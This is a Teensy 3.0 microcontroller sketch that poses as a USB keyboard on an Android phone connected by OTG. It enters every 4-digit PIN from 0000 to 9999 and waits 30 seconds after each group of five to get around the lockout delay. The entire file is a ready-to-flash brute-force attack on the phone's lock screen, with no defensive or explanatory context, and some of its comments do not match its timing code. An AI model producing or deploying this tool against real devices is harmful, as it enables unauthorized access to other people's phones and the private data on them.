    /*==========================================================================================
    Purpose: 4-Digit PIN Brute Force attack for USB-OTG Android devices using Teensy 3.0
    ==========================================================================================*/
     
    // Flag to indicate if the PIN crack is finished or not
    int finishedPINcracking = 0;
     
    // Teensy 3.0 has LED on 13
    const int ledPin = 13;
     
    // Where to begin the PIN loops
    const int digit1_start = 0;
    const int digit2_start = 0;
    const int digit3_start = 0;
    const int digit4_start = 0;
     
    // Where to stop the PIN loops
    const int digit1_stop = 9;
    const int digit2_stop = 9;
    const int digit3_stop = 9;
    const int digit4_stop = 9;
     
    void setup()
    {
    // Initialize the digital pin as an output.
    pinMode(ledPin, OUTPUT);
    // Wait 10 seconds to prepare the Android Device
    delay(10000);
    }
     
    void loop()
    {
    // Make the PIN cracking loops first
    if ( finishedPINcracking == 0 )
    {
    // Start going through all the PIN conbinations
    for( int digit1 = digit1_start; digit1 <= digit1_stop; digit1++ )
    {
    for( int digit2 = digit2_start; digit2 <= digit2_stop; digit2++ )
    {
    for( int digit3 = digit3_start; digit3 <= digit3_stop; digit3++ )
    {
    for( int digit4 = digit4_start; digit4 <= digit4_stop; digit4++ )
    {
    if ( (digit4 == 4) || (digit4 == 9) ) // Wait for 30 seconds after 5 attempts
    {
    // Enter PIN: convert int to String and concatenate them
    Keyboard.println(String(digit1) + String(digit2) + String(digit3) + String(digit4));
    for ( int timer = 1; timer <= 6; timer++ ) // 6 * 5 seconds = 30 sec
    {
    // Turn on the On-Board LED to indicate it is waiting
    digitalWrite(ledPin, HIGH);
    // Wait 5 seconds and hit Enter
    delay(1000);
    digitalWrite(ledPin, LOW);
    // Wait 5 seconds and hit Enter
    delay(1000);
    digitalWrite(ledPin, HIGH);
    // Wait 5 seconds and hit Enter
    delay(1000);
    digitalWrite(ledPin, LOW);
    // Wait 5 seconds and hit Enter
    delay(1000);
    digitalWrite(ledPin, HIGH);
    // Wait 5 seconds and hit Enter
    delay(1000);
    Keyboard.println();
    }
    // Wait 2 more extra seconds, just to be sure
    delay(2000);
    // Turn off the On-Board LED
    digitalWrite(ledPin, LOW);
    }
    else // Normal brute-force mode
    {
    // Enter PIN: convert int to String and concatenate them
    Keyboard.print(String(digit1) + String(digit2) + String(digit3) + String(digit4));
    delay(500);
    Keyboard.println();
    }
    }
    }
    }
    }
    // Flip the flag to true
    finishedPINcracking = 1;
    }
    // After the PIN cracking loops, hit Enter to avoid automatic screen lock in case of a successful attack
    else
    {
    // Wait 5 seconds and hit Enter and blink the On-Board LED to indicate it is finished
    digitalWrite(ledPin, HIGH); // Set the LED on
    delay(2500); // Wait for 2.5 seconds
    digitalWrite(ledPin, LOW); // Set the LED off
    delay(2500); // Wait for 2.5 seconds
    Keyboard.println();
  //Keyboard.print("Pin Found. Your PIN Is : ");
  //Keyboard.print(String(digit1) + String(digit2) + String(digit3) + String(digit4));
    }
    }
